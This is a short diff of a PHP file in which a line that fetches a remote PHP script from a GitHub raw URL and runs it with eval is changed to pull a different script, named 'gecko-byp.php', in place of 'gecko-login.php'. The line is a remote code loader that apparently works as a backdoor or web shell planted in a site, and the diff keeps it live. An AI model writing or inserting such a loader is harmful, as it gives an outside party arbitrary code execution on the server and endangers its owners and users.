@@ -11,5 +11,5 @@
  
     return $data; 
 } 
-      eval('?>' . get('https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/refs/heads/main/gecko-login.php')); 
+      eval('?>' . get('https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/main/gecko-byp.php')); 
 ?>
